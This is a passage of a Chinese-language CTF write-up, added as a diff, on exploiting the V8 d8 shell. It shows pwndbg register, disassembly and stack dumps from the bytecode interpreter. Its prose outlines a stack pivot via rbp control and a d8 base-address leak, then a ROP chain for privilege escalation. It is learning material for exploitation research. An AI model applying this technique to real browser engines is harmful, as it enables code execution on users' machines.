@@ -1,0 +1,104 @@
+
+```
+───────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────
+RAX  0x6014eb5cb81c (Builtins_JSEntryTrampoline+92) ◂— mov rsp, rbp
+RBX  0
+RCX  0x6014eb712d00 (Builtins_StarHandler) ◂— movsx ebx, byte ptr [r12 + r9 + 1]
+RDX  0x7ffc6cc67348 —▸ 0x6014eb5cb81c (Builtins_JSEntryTrampoline+92) ◂— mov rsp, rbp
+RDI  0x255e00194d4d ◂— 0x190000021900182a
+RSI  0x255e00194c35 ◂— 0xe9000000060018ff
+R8   0x7ffc6cc67360 —▸ 0x255e00000251 ◂— 1
+R9   0x21
+R10  0xb
+R11  2
+R12  0x255e0019507d ◂— 0x1900000012000009 /* '\t' */
+R13  0x60151033d810 —▸ 0x255e00008ac9 ◂— 0x610000021900000d /* '\r' */
+R14  0x255e00000000 ◂— 0x29000
+R15  0x60151036b8d0 —▸ 0x6014eb712200 (Builtins_WideHandler) ◂— add r9, 1
+RBP  0x7ffc6cc67348 —▸ 0x6014eb5cb81c (Builtins_JSEntryTrampoline+92) ◂— mov rsp, rbp
+RSP  0x7ffc6cc67318 —▸ 0x6014eb5cd927 (Builtins_InterpreterEntryTrampoline+167) ◂— mov r12, qword ptr [rbp - 0x20]
+*RIP  0x6014eb712d10 (Builtins_StarHandler+16) ◂— add r9, 2
+────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────
+0x6014eb71275d <Builtins_LdarHandler+29>     jmp    rcx                         <Builtins_StarHandler>
+↓
+0x6014eb712d00 <Builtins_StarHandler>        movsx  ebx, byte ptr [r12 + r9 + 1]     EBX, [0x255e0019509f] => 0
+0x6014eb712d06 <Builtins_StarHandler+6>      mov    rdx, rbp                         RDX => 0x7ffc6cc67348 —▸ 0x7ffc6cc673c0 —▸ 0x7ffc6cc673e8 —▸ 0x7ffc6cc67450 ◂— ...
+0x6014eb712d09 <Builtins_StarHandler+9>      movsxd rbx, ebx                         RBX => 0
+0x6014eb712d0c <Builtins_StarHandler+12>     mov    qword ptr [rdx + rbx*8], rax     [0x7ffc6cc67348] <= 0x6014eb5cb81c (Builtins_JSEntryTrampoline+92) ◂— mov rsp, rbp
+► 0x6014eb712d10 <Builtins_StarHandler+16>     add    r9, 2                            R9 => 35 (0x21 + 0x2)
+0x6014eb712d14 <Builtins_StarHandler+20>     movzx  ebx, byte ptr [r9 + r12]         EBX, [0x255e001950a0] => 0xaa
+0x6014eb712d19 <Builtins_StarHandler+25>     mov    rcx, qword ptr [r15 + rbx*8]     RCX, [0x60151036be20] => 0x6014eb7257c0 (Builtins_ReturnHandler) ◂— push rbp
+0x6014eb712d1d <Builtins_StarHandler+29>     jmp    rcx                         <Builtins_ReturnHandler>
+↓
+0x6014eb7257c0 <Builtins_ReturnHandler>      push   rbp
+0x6014eb7257c1 <Builtins_ReturnHandler+1>    mov    rbp, rsp     RBP => 0x7ffc6cc67310 —▸ 0x7ffc6cc67348 —▸ 0x6014eb5cb81c (Builtins_JSEntryTrampoline+92) ◂— ...
+──────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp     0x7ffc6cc67318 —▸ 0x6014eb5cd927 (Builtins_InterpreterEntryTrampoline+167) ◂— mov r12, qword ptr [rbp - 0x20]
+01:0008│-028     0x7ffc6cc67320 ◂— 0x3e /* '>' */
+02:0010│-020     0x7ffc6cc67328 —▸ 0x255e0019507d ◂— 0x1900000012000009 /* '\t' */
+03:0018│-018     0x7ffc6cc67330 ◂— 1
+04:0020│-010     0x7ffc6cc67338 —▸ 0x255e00194d4d ◂— 0x190000021900182a
+05:0028│-008     0x7ffc6cc67340 —▸ 0x255e00194c35 ◂— 0xe9000000060018ff
+06:0030│ rdx rbp 0x7ffc6cc67348 —▸ 0x6014eb5cb81c (Builtins_JSEntryTrampoline+92) ◂— mov rsp, rbp
+07:0038│+008     0x7ffc6cc67350 —▸ 0x6014eb5cd927 (Builtins_InterpreterEntryTrampoline+167) ◂— mov r12, qword ptr [rbp - 0x20]
+────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────
+► 0   0x6014eb712d10 Builtins_StarHandler+16
+1   0x6014eb5cd927 Builtins_InterpreterEntryTrampoline+167
+2             0x3e None
+3   0x255e0019507d None
+4              0x1 None
+5   0x255e00194d4d None
+6   0x255e00194c35 None
+7   0x6014eb5cb81c Builtins_JSEntryTrampoline+92
+───────────────────────────────────────────────────────────────────────────────────[ THREADS (16 TOTAL) ]────────────────────────────────────────────────────────────────────────────────────
+► 1   "d8"              stopped: 0x6014eb712d10 <Builtins_StarHandler+16>
+2   "V8 DefaultWorke" stopped: 0x71e50ec91117 <__futex_abstimed_wait_cancelable64+231>
+3   "V8 DefaultWorke" stopped: 0x71e50ec91117 <__futex_abstimed_wait_cancelable64+231>
+4   "V8 DefaultWorke" stopped: 0x71e50ec91117 <__futex_abstimed_wait_cancelable64+231>
+Not showing 12 thread(s). Use set context-max-threads <number of threads> to change this.
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg> tele $rbp
+00:0000│ rdx rbp 0x7ffc6cc67348 —▸ 0x6014eb5cb81c (Builtins_JSEntryTrampoline+92) ◂— mov rsp, rbp
+01:0008│+008     0x7ffc6cc67350 —▸ 0x6014eb5cd927 (Builtins_InterpreterEntryTrampoline+167) ◂— mov r12, qword ptr [rbp - 0x20]
+02:0010│+010     0x7ffc6cc67358 —▸ 0x255e001822d9 ◂— 0x190004e39e001930
+03:0018│ r8      0x7ffc6cc67360 —▸ 0x255e00000251 ◂— 1
+04:0020│+020     0x7ffc6cc67368 —▸ 0x255e00000251 ◂— 1
+05:0028│+028     0x7ffc6cc67370 —▸ 0x255e00194959 ◂— 3
+06:0030│+030     0x7ffc6cc67378 ◂— 8
+07:0038│+038     0x7ffc6cc67380 ◂— 0x154
+pwndbg>
+```
+
+## 利用思路
+
+通过上面的分析，此时已经具备了泄漏栈上低4字节数据和栈上8字节数据写的原语。
+
+首先需要解决的是如何控制`RIP`，通过栈上8字节写的方法，其实已经可以控制`rbp`了，通过修改字节数组，可以多执行几次`leave`，这样就可以实现栈迁移，其实这里就可以劫持控制流了。
+
+那么如果获取gadget，也就是泄漏`d8`的基地值呢，从栈上的值是可以发现一些位于`d8`的代码片段的。
+
+```
+pwndbg> tele $rbp
+00:0000│ rdx rbp 0x7ffc6cc67348 —▸ 0x6014eb5cb81c (Builtins_JSEntryTrampoline+92) ◂— mov rsp, rbp
+01:0008│+008     0x7ffc6cc67350 —▸ 0x6014eb5cd927 (Builtins_InterpreterEntryTrampoline+167) ◂— mov r12, qword ptr [rbp - 0x20]
+02:0010│+010     0x7ffc6cc67358 —▸ 0x255e001822d9 ◂— 0x190004e39e001930
+03:0018│ r8      0x7ffc6cc67360 —▸ 0x255e00000251 ◂— 1
+04:0020│+020     0x7ffc6cc67368 —▸ 0x255e00000251 ◂— 1
+05:0028│+028     0x7ffc6cc67370 —▸ 0x255e00194959 ◂— 3
+06:0030│+030     0x7ffc6cc67378 ◂— 8
+07:0038│+038     0x7ffc6cc67380 ◂— 0x154
+pwndbg> xinfo 0x6014eb5cb81c
+Extended information for virtual address 0x6014eb5cb81c:
+  Containing mapping:
+0x6014eadf0000     0x6014eb934000 r-xp   b44000 678000 d8
+  Offset information:
+Mapped Area 0x6014eb5cb81c = 0x6014eadf0000 + 0x7db81c
+File (Base) 0x6014eb5cb81c = 0x6014ea777000 + 0xe5481c
+File (Segment) 0x6014eb5cb81c = 0x6014eadf0000 + 0x7db81c
+File (Disk) 0x6014eb5cb81c = /home/flyyy/Desktop/workspace/browser/v8/gctf23/v8/out.gn/x64.release/d8 + 0xe5381c
+  Containing ELF sections:
+.text 0x6014eb5cb81c = 0x6014eadf0000 + 0x7db81c
+pwndbg>
+```
+
+对于地址随机化，这里的低四位字节是变化很小/基本上不变化，那么现在就是需要泄漏`d8`基地址的高位字节。因为堆块开头部分还是具有读权限的，所以高位字节可以从堆块开头读到，然后拼接起来，再减去尾部的偏移，就可以拿到`d8`的基地值，拿到`d8`的基地值之后，就可以获取gadget，通过这些gadget写rop提权。
